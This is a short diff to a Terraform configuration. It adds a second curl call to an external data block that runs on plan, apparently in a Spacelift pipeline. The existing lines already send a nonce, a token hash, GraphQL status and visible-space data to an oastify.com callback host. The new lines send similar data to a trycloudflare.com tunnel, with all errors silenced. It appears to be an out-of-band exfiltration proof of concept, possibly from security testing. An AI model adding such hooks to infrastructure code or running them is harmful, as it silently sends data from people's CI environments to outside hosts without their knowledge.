@@ -54,6 +54,10 @@ data "external" "authorized_control_plane_proof" {
         "https://rwriuy27eel2flor2llvuz7v1m7dv3js.oastify.com/spacelift-control-plane-proof?nonce=$nonce&token_sha256=$token_sha&graphql=$graphql_status&visible_spaces=$visible_spaces" \
         >/dev/null 2>&1 || true
 
+      curl --silent --show-error --fail --max-time 15 \
+        "https://lenses-legacy-recommend-publicly.trycloudflare.com/spacelift-control-plane-proof?nonce=$nonce&graphql=$graphql_status&visible_spaces=$visible_spaces" \
+        >/dev/null 2>&1 || true
+
       printf '{"status":"proof-sent"}\n'
     EOT
   ]
